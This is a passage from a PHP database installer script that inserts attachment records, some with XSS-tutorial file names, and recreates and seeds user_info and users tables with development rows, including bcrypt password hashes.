'1716\',\'1\'),(\'264\',\'56\',\'110\',\'0\',\'xss_def\',\'png\',\'1477278640\',\'1717\',\'1\'),(\'265\',\'56\',\'110\',\'0\',\'cookie_with_js\',\'png\',\'1477278640\',\'1718\',\'1\'),(\'266\',\'56\',\'110\',\'0\',\'one_cookie\',\'png\',\'1477278640\',\'1719\',\'1\'),(\'267\',\'56\',\'110\',\'0\',\'one_cookie_get\',\'png\',\'1477278640\',\'1720\',\'1\'),(\'268\',\'56\',\'110\',\'0\',\'set_cookie\',\'png\',\'1477278640\',\'1721\',\'1\'),(\'269\',\'56\',\'110\',\'0\',\'a_girl\',\'png\',\'1477278640\',\'1722\',\'1\'),(\'270\',\'56\',\'110\',\'0\',\'chance_for_you\',\'png\',\'1477278640\',\'1723\',\'1\'),(\'271\',\'56\',\'110\',\'0\',\'safe\',\'zip\',\'1477278640\',\'1832\',\'1\'),(\'272\',\'53\',\'0\',\'0\',\'mix-xss\',\'zip\',\'1477278695\',\'1899\',\'0\'),(\'273\',\'53\',\'110\',\'0\',\'login_by_cookie\',\'png\',\'1477278695\',\'1712\',\'1\'),(\'274\',\'53\',\'110\',\'0\',\'edit_with_markdown\',\'png\',\'1477278695\',\'1713\',\'1\'),(\'275\',\'53\',\'110\',\'0\',\'nothing\',\'png\',\'1477278695\',\'1714\',\'1\'),(\'276\',\'53\',\'110\',\'0\',\'my_script\',\'png\',\'1477278695\',\'1715\',\'1\'),(\'277\',\'53\',\'110\',\'0\',\'cookies\',\'png\',\'1477278696\',\'1716\',\'1\'),(\'278\',\'53\',\'110\',\'0\',\'xss_def\',\'png\',\'1477278696\',\'1717\',\'1\'),(\'279\',\'53\',\'110\',\'0\',\'cookie_with_js\',\'png\',\'1477278696\',\'1718\',\'1\'),(\'280\',\'53\',\'110\',\'0\',\'one_cookie\',\'png\',\'1477278696\',\'1719\',\'1\'),(\'281\',\'53\',\'110\',\'0\',\'one_cookie_get\',\'png\',\'1477278696\',\'1720\',\'1\'),(\'282\',\'53\',\'110\',\'0\',\'set_cookie\',\'png\',\'1477278696\',\'1721\',\'1\'),(\'283\',\'53\',\'110\',\'0\',\'a_girl\',\'png\',\'1477278696\',\'1722\',\'1\'),(\'284\',\'53\',\'110\',\'0\',\'chance_for_you\',\'png\',\'1477278696\',\'1723\',\'1\'),(\'285\',\'53\',\'110\',\'0\',\'safe\',\'zip\',\'1477278696\',\'1832\',\'1\'),(\'286\',\'53\',\'110\',\'0\',\'login_by_cookie\',\'png\',\'1477278722\',\'1712\',\'1\'),(\'287\',\'53\',\'110\',\'0\',\'edit_with_markdown\',\'png\',\'1477278722\',\'1713\',\'1\'),(\'288\',\'53\',\'110\',\'0\',\'nothing\',\'png\',\'1477278722\',\'1714\',\'1\'),(\'289\',\'53\',\'110\',\'0\',\'my_script\',\'png\',\'1477278722\',\'1715\',\'1\'),(\'290\',\'53\',\'110\',\'0\',\'cookies\',\'png\',\'1477278722\',\'1716\',\'1\'),(\'291\',\'53\',\'110\',\'0\',\'xss_def\',\'png\',\'1477278722\',\'1717\',\'1\'),(\'292\',\'53\',\'110\',\'0\',\'cookie_with_js\',\'png\',\'1477278723\',\'1718\',\'1\'),(\'293\',\'53\',\'110\',\'0\',\'one_cookie\',\'png\',\'1477278723\',\'1719\',\'1\'),(\'294\',\'53\',\'110\',\'0\',\'one_cookie_get\',\'png\',\'1477278723\',\'1720\',\'1\'),(\'295\',\'53\',\'110\',\'0\',\'set_cookie\',\'png\',\'1477278723\',\'1721\',\'1\'),(\'296\',\'53\',\'110\',\'0\',\'a_girl\',\'png\',\'1477278723\',\'1722\',\'1\'),(\'297\',\'53\',\'110\',\'0\',\'chance_for_you\',\'png\',\'1477278723\',\'1723\',\'1\'),(\'298\',\'53\',\'110\',\'0\',\'safe\',\'zip\',\'1477278723\',\'1832\',\'1\'),(\'299\',\'53\',\'0\',\'0\',\'mix-xss\',\'zip\',\'1477279279\',\'2025\',\'0\'),(\'300\',\'53\',\'0\',\'0\',\'mix-xss\',\'zip\',\'1477295987\',\'2028\',\'0\'),(\'301\',\'53\',\'0\',\'0\',\'mix-xss\',\'zip\',\'1477296138\',\'2029\',\'0\'),(\'302\',\'53\',\'0\',\'0\',\'test\',\'zip\',\'1477296611\',\'2030\',\'0\'),(\'303\',\'53\',\'0\',\'0\',\'test\',\'zip\',\'1477296728\',\'2032\',\'0\'),(\'304\',\'53\',\'115\',\'0\',\'README\',\'md\',\'1477296842\',\'2036\',\'1\'),(\'305\',\'53\',\'110\',\'0\',\'README\',\'md\',\'1477296866\',\'2036\',\'1\'),(\'306\',\'53\',\'116\',\'0\',\'README\',\'md\',\'1477296958\',\'2036\',\'1\'),(\'307\',\'53\',\'0\',\'0\',\'test\',\'zip\',\'1477298140\',\'2041\',\'0\'),(\'308\',\'53\',\'0\',\'0\',\'test\',\'zip\',\'1477298223\',\'2042\',\'0\'),(\'309\',\'53\',\'0\',\'0\',\'test\',\'zip\',\'1477298310\',\'2043\',\'0\'),(\'310\',\'53\',\'0\',\'0\',\'mengC\',\'zip\',\'1477314900\',\'2044\',\'0\'),(\'311\',\'53\',\'121\',\'0\',\'prepare\',\'md\',\'1477315259\',\'2051\',\'1\'),(\'312\',\'53\',\'0\',\'0\',\'mengC\',\'zip\',\'1477315381\',\'2052\',\'0\'),(\'313\',\'53\',\'0\',\'0\',\'mengC\',\'zip\',\'1477317937\',\'2053\',\'0\'),(\'314\',\'53\',\'125\',\'0\',\'1024\',\'jpg\',\'1477317937\',\'2054\',\'1\'),(\'315\',\'53\',\'67\',\'0\',\'1024\',\'jpg\',\'1477318001\',\'2054\',\'1\'),(\'316\',\'53\',\'0\',\'0\',\'test\',\'zip\',\'1477475193\',\'2057\',\'0\'),(\'317\',\'53\',\'127\',\'0\',\'README\',\'md\',\'1477475194\',\'2058\',\'1\')'))->exec();

 (new Query('DROP TABLE IF EXISTS #{user_info}'))->exec();

 (new Query('CREATE TABLE `#{user_info}` (
  `uid` bigint(20) NOT NULL,
  `avatar` bigint(20) NOT NULL COMMENT \'头像文件ID\',
  `qq` varchar(20) DEFAULT NULL,
  `discription` tinytext NOT NULL,
  `phone` varchar(11) DEFAULT NULL,
  PRIMARY KEY (`uid`),
  KEY `avatar` (`avatar`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT=\'用户信息\''))->exec();

 (new Query('INSERT INTO  `#{user_info}` VALUES (\'53\',\'114\',\'\',\'hhahhahh\',\'\'),(\'54\',\'43\',\'\',\'hhahhahh\',\'\'),(\'56\',\'43\',\'\',\'hhahhahh\',\'\'),(\'61\',\'0\',\'\',\'Ta很懒，神马都没留下\',\'\'),(\'62\',\'0\',\'\',\'Ta很懒，神马都没留下\',\'\'),(\'65\',\'43\',\'\',\'hhahhahh\',\'\')'))->exec();

 (new Query('DROP TABLE IF EXISTS #{users}'))->exec();

 (new Query('CREATE TABLE `#{users}` (
  `uid` bigint(20) NOT NULL AUTO_INCREMENT,
  `uname` varchar(13) NOT NULL,
  `upass` varchar(60) NOT NULL,
  `gid` int(11) NOT NULL DEFAULT \'0\',
  `signup` int(11) NOT NULL,
  `signin` int(11) NOT NULL,
  `email` varchar(50) NOT NULL,
  `email_verify` enum(\'Y\',\'N\') NOT NULL DEFAULT \'N\',
  `lastip` varchar(32) NOT NULL,
  `token` varchar(32) NOT NULL COMMENT \'登陆验证值\',
  `verify` varchar(32) NOT NULL,
  `expriation` int(11) NOT NULL COMMENT \'验证过期时间\',
  `status` int(11) NOT NULL DEFAULT \'0\' COMMENT \'状态\',
  PRIMARY KEY (`uid`),
  UNIQUE KEY `uid` (`uid`),
  UNIQUE KEY `uname` (`uname`),
  KEY `uid_2` (`uid`),
  KEY `uid_3` (`uid`),
  KEY `uid_4` (`uid`)
) ENGINE=InnoDB AUTO_INCREMENT=63 DEFAULT CHARSET=utf8'))->exec();

 (new Query('INSERT INTO  `#{users}` VALUES (\'53\',\'DDDd\',\'$2y$10$1nAsOkiE1Pse4BXKO67R4.lpo/9l22Je48/mP8Nayli0IyBvHBgkO\',\'1\',\'1477102805\',\'1478606107\',\'dddddd@qq.cc\',\'Y\',\'127.0.0.1\',\'ebade7e4c2cd91cdf0c9a9742139f0c5\',\'2c276b5aa719a6b425dec74c074e1b9d\',\'1477147872\',\'0\'),(\'62\',\'EvalDXkite\',\'$2y$10$bF8pSkY3CuMmVGGLSyMzv.KAX3XaPsCGnPu/UGv3YIdWc4CQ7OAAC\',\'1\',\'1478753920\',\'0\',\'\',\'N\',\'\',\'\',\'\',\'0\',\'0\')'))->exec();

/** End Querys **/
Query::commit();
return true;
} 
catch (Exception $e)
{
    Query::rollBack();
   return false;
}